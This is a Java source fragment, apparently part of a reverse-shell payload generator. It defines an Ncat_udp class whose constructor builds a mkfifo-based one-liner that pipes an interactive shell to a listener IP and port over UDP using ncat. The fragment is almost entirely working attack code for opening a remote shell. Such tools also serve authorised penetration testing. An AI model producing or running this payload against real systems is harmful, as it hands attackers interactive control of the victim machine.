...
public class Ncat_udp extends Reverse {

    protected String shellFormat = "";

    public Ncat_udp(String localIP, int localPort, LISTENER listener, SHELLS shellType){
        super(localIP, localPort, listener, shellType);
        shellFormat = String.format("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|%s -i 2>&1|ncat -u %s %s >/tmp/f", this.getShell(), this.getLocalIP(), this.getLocalPort());
    }
